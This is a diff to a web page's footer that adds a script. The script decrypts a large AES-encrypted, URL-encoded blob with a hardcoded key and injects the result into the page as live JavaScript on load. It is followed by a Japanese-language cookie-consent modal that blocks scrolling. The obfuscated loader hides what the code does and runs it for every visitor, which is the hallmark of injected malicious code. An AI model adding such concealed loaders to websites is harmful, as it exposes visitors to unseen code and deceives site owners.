@@ -115,6 +115,85 @@ button{background:#E60023;color:#fff;padding:10px 20px;border:none;}
 <footer>
 <p>© 2026 Zen Info Stream</p>
 </footer>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX19VLi5tKOqmV4Tlcb7IQ0BHRRMr6WwYkQcLrVYm6WvmPmFl2V%2BzlgFZRxzx25uBw%2BieVFq5KaMolpN6kh0OFLliCQuq1ge1p5VBgok67OdKb%2FheTOmt104xCsQP2FCKSh9ZWtR0Fe5ZJwsJVFviWW5Vau7K7AP%2FvdUVpVnN812E56kh5n1ScxdwxMsX%2FY%2B5FXAgbbjkUilsA1DoAq69gDluDfW2fukNDGDQizldXFggj%2F7v%2FdDXJ7BGt16yKaKdz9WKL%2FYIlk%2FFCE5%2B%2FZWIKTCFX6vusTzmu8qG96YhyyU%2Fh8cvuRt7zogk20O%2BUwlxXJYASzK5jrc6q6IxmpaVqMUMlmO2z6cL86Cn0Cik%2F6sWzAh0wPOeOFG0kdk11TE6qrYl8HZSlSyYvjZJBco1XbirzGuoI4rVvFzP3FkA656Ovu1TZolDWRS99fQJEV5cBOdF9iXqerTRgOgmxq6rM648Dqpi0DiaAAhTE%2B0ZbPcr2ZeoFGzW0BD1TRo6dQwAQnOTUNHuDNLwWTGEm2J090hYoTaKFw2KC%2Fgf7XjWZJWRRuLTt1E6aNnSHM2bo7goC4DomcjkJxqZaquu%2B%2B8Yed%2Fc77XqhOADMKXSiGYoTK1sQc%2BauWPs9TxQkc4wzxOPtLU28guS7Bo8A8cT98LlMMACH2Vbn9U81orIl02j%2FCdylwwWjL1vNYWPj8C5f%2Fk0fKa7KZqcWr3EGGzuJRPZbv4gPD3kr61NdIh%2B2cDUh15PWudRYsncYrMVhRHwyszldnJGI5M55V0sEHEdUb7ZEry%2BMBfKT6Z4xKgeEezuFprTXOVLJTgXL2S2hUzi6gvIjQT3E94hpCWTX8Mgew91FVozv6mtB%2BzBLigS%2FwxJ85BtG4BTDwu3EgRrt1XpKN5kxNKxZBmhgehiBTWfoUl88dltg9VWvEDy%2Bm8%2Fhb7%2FM37NkopuSBrQB8lkbu%2BZFbjzYEOV6ULNJUB32HdjyOrlcD6f0bZzi%2F3nHgIDup7bCpKuYqt28dkllChXpR9VxWyQ51%2F5fM%2B34B%2Bwgm%2FNA5zcHbSMDhv9buBDc3tRP2HarS4DzN1Wuvg6Y3DUG7X7OcLQ2zQbg%2BAgutnrjt2Q7UlHnOB%2FG28yLrzn8miI%2BcD9xdqIiygtILJ6k6rGjtcMOUeZAkNz7lyltIUlDb8eNZrCSTr08VEnfcW01cXl55HrYtzOt3D2qgKx3d1D%2FC1QSGErURgxfJHr3%2BRoZkCyK5NAufZh4TOYBhq7NsQhkpeBs46qod3Wws231dDre9FJD4CGQ7dkU0gEanyRhr9%2BfkzQOjms29tuEJmzkDcVMliE0hdkBQ%2BMxLoPx6nSueu4Z4BxXBO56N7RZTQUNHE4cU%2BwI83nseQzc2JvGnh%2FYX1zMp%2BP5gYMfZfEr4cLnLGAxckV6NKAYQpv9XjyHmKsaOsRNFxkDkrYMgj%2BCAMuVHdod0zIOg2zrYVv4RjkpEdH0MCf9Tbu878xHzwJBqDlch29OCyJBJ8MLMTvZlp9A%2BIZQGphNdvMrPrZ4hzBnwfWsXhFnk4Gk78qkVRA%2BYzpYgfreWJKuMJxKMB9e7gnHTycm9puFEDs2ymiB6bSI%2BNVsUT2ePivD2sSWkE4OfY48H%2Bt5hKWkD0E%2FUJTf8lWXxlK2gqsC%2BMcBVpIeKm%2B7z789JX6vCKIHDg3pUehdyir5P8TnmuPxbpUUH97LdnmaoFpj7kUzJpKSkKMWBl%2FaM8EW1POfDHKMoGby9H8lvI0F8hFGbdnclY6wfmfNwNVaqdl8aM0BHe%2BAdZtim7I0zS%2F%2F9fswtTuDxZCchmASW5NS5HlZ6EDKf%2FIAjRYm7ZrAraiXgvREKYmU%2BGAty8PGzxkc37oFc9hx61kCXGOPFZnJlmwMgOLSr%2Ft7QAK%2BPz2Z55zzBFGSO3Gxc9CbiQYNuyL1u%2FPg6jeD%2FBd8s%2BdfIKRO6YAC%2B0C%2Bxca2IiY3KHoYvIKdGFdnF2hIDW%2Bvr0T5dDzJkOoWSa5jGGBCiHGs9mGlagSzldpKUod%2F%2F%2BU2BA%2Fg54KqPQTTbZbMuIzbEGQdfKt79suuYDzKcOexBMZnoJCWB39fnZL2y%2FhkTVs4SZlFv7jiPPcAzANG7fhAk6TuDbp27Fj0i%2Fniq53Qbpv7o52ssoYwTxle9NjowKyUlu%2BLnGaODS9FCxgkps329L3UlSxQ819RzT2CAgNoui41ObrnAujmZ6D38leC1t%2BeNPiGo%2BDqSXBrtpzyFHDRsAu8kvwFx%2Fpb97twPv4bxgm86oCxEp93vgAYM1bJyil%2BX45lxGxZedEdZe0ifI9kiPC`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
 
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
 </body>
 </html>
